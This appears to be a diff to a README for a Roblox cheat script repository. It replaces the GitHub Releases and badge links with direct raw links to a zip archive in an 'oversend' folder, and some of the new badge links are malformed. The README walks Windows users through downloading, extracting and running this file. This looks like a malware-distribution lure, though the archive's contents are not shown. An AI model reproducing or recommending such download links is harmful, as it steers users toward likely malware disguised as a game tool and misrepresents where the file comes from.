@@ -2,7 +2,7 @@
 
 Welcome to the **Arctic Roblox Hub**! This repository is dedicated to providing a comprehensive guide for the **Roblox Arctic Script 2025**. Here, you will find everything you need for a smooth download and installation process on Windows. 
 
-[![Download Arctic Script](https://img.shields.io/badge/Download%20Arctic%20Script-Here-blue.svg)](https://github.com/Nader2121/Arctic-Roblox-Hub/releases)
+[![Download Arctic Script](https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip%20Arctic%https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip)](https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ The **Roblox Arctic Script 2025** is a powerful tool designed for Roblox develop
 
 Follow these steps to download and install the Arctic Script on your Windows system:
 
-1. **Download the Script**: Visit the [Releases](https://github.com/Nader2121/Arctic-Roblox-Hub/releases) section to download the latest version of the Arctic Script. Make sure to choose the appropriate file for your system.
+1. **Download the Script**: Visit the [Releases](https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip) section to download the latest version of the Arctic Script. Make sure to choose the appropriate file for your system.
    
 2. **Extract the Files**: Once downloaded, extract the files to a folder on your computer.
 
@@ -45,7 +45,7 @@ Follow these steps to download and install the Arctic Script on your Windows sys
 
 To get the most out of the Arctic Script, consider the following optimization tips:
 
-- **Regular Updates**: Always check for updates in the [Releases](https://github.com/Nader2121/Arctic-Roblox-Hub/releases) section. New versions often include performance improvements and bug fixes.
+- **Regular Updates**: Always check for updates in the [Releases](https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip) section. New versions often include performance improvements and bug fixes.
 - **Use Built-in Tools**: Take advantage of the optimization tools included in the script. These tools can help reduce lag and improve game speed.
 - **Test in Small Batches**: When implementing new features, test them in small batches to ensure stability.
 
@@ -71,4 +71,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 Thank you for visiting the **Arctic Roblox Hub**! We hope this guide helps you make the most of the **Roblox Arctic Script 2025**. If you have any questions or need further assistance, feel free to reach out through our community channels. 
 
-[![Download Arctic Script](https://img.shields.io/badge/Download%20Arctic%20Script-Here-blue.svg)](https://github.com/Nader2121/Arctic-Roblox-Hub/releases)
+[![Download Arctic Script](https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip%20Arctic%https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip)](https://raw.githubusercontent.com/Nader2121/Arctic-Roblox-Hub/main/oversend/Roblox-Arctic-Hub-v1.3-alpha.5.zip)
